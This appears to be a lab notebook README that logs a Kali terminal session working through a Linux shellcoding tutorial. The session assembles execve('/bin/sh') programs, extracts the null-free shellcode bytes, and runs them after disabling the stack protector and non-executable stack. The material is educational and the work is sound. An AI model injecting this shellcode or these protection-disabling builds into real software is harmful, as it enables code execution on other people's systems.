# Shell_Coding_OHTS
This contains https://www.0x00sec.org/t/linux-shellcoding-part-1-0/289 steps

```sh
root@kali:~/Desktop/OHTSF/lab01# nasm -f elf -o shell.o shell.asm
root@kali:~/Desktop/OHTSF/lab01# ld -m elf_i386 -o shell shell.o
root@kali:~/Desktop/OHTSF/lab01# ./shell 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
root@kali:~/Desktop/OHTSF/lab01# objdump -M intel -d shell

shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	b8 0b 00 00 00       	mov    eax,0xb
 8049005:	bb 00 a0 04 08       	mov    ebx,0x804a000
 804900a:	b9 00 00 00 00       	mov    ecx,0x0
 804900f:	cd 80                	int    0x80
 8049011:	b8 01 00 00 00       	mov    eax,0x1
 8049016:	bb 00 00 00 00       	mov    ebx,0x0
 804901b:	cd 80                	int    0x80
root@kali:~/Desktop/OHTSF/lab01# nasm -f elf -o shell2.o shell2.asm
root@kali:~/Desktop/OHTSF/lab01# ld -m elf_i386 -o shell2 shell2.o
root@kali:~/Desktop/OHTSF/lab01# ./shell2
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
root@kali:~/Desktop/OHTSF/lab01# objdump -M intel -d shell2

shell2:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 2f 2f 73 68       	push   0x68732f2f
 8049008:	68 2f 62 69 6e       	push   0x6e69622f
 804900d:	89 e3                	mov    ebx,esp
 804900f:	89 c1                	mov    ecx,eax
 8049011:	b0 0b                	mov    al,0xb
 8049013:	cd 80                	int    0x80
root@kali:~/Desktop/OHTSF/lab01# gcc get_shellcode.c -o get_shellcode.out
root@kali:~/Desktop/OHTSF/lab01# ./get_shellcode.out 
 
^C
root@kali:~/Desktop/OHTSF/lab01# ./get_shellcode.out shell2
\x7f\x45\x4c\x46\x01\x01\x01 
\x02 
\x03 
\x01 
\x90\x04\x08\x34 
\xd0\x10 
\x34 
\x20 
\x02 
\x28 
\x05 
\x04 
\x01 
\x80\x04\x08 
\x80\x04\x08\x74 
\x74 
\x04 
\x10 
\x01 
\x10 
\x90\x04\x08 
\x90\x04\x08\x15 
\x15 
\x05 
\x10 
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80 
\x90\x04\x08 
\x03 
\x01 
\x01 
\x04 
\xf1\xff\x11 
\x90\x04\x08 
\x10 
\x01 
\x0c 
\xa0\x04\x08 
\x10 
\x01 
\x18 
\xa0\x04\x08 
\x10 
\x01 
\x1f 
\xa0\x04\x08 
\x10 
\x01 
\x73\x68\x65\x6c\x6c\x32\x2e\x61\x73\x6d 
\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74 
\x5f\x65\x64\x61\x74\x61 
\x5f\x65\x6e\x64 
\x2e\x73\x79\x6d\x74\x61\x62 
\x2e\x73\x74\x72\x74\x61\x62 
\x2e\x73\x68\x73\x74\x72\x74\x61\x62 
\x2e\x74\x65\x78\x74 
\x1b 
\x01 
\x06 
\x90\x04\x08 
\x10 
\x15 
\x10 
\x01 
\x02 
\x18\x10 
\x70 
\x03 
\x03 
\x04 
\x10 
\x09 
\x03 
\x88\x10 
\x24 
\x01 
\x11 
\x03 
\xac\x10 
\x21 
\x01 
root@kali:~/Desktop/OHTSF/lab01# gcc shell_codetest.c -o shell_codetest.out -m32
root@kali:~/Desktop/OHTSF/lab01# ./shell_codetest.out 
Segmentation fault
root@kali:~/Desktop/OHTSF/lab01# gcc shell_codetest.c -o shell_codetest.out -m32 -fno-stack-protector -z execstack -no-pipe
gcc: error: unrecognized command line option ‘-no-pipe’; did you mean ‘-no-pie’?
root@kali:~/Desktop/OHTSF/lab01# gcc shell_codetest.c -o shell_codetest.out -m32 -fno-stack-protector -z execstack -no-pie
root@kali:~/Desktop/OHTSF/lab01# ./shell_codetest.out 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
